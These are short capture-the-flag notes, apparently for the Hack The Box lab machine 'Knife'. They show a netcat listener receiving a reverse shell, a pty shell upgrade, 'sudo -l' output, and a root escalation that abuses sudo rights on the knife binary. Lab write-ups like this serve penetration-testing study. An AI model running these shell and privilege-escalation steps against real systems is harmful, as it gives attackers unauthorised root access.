# Getting a Shell

![[Pasted image 20211227011119.png]]


```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.242] 40640
bash: cannot set terminal process group (970): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
james@knife:/$ sudo -l 
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:/$ 
```

### Getting Root

``` bash
sudo knife exec -E 'exec "/bin/sh"'
```

![[Pasted image 20211227011345.png]]
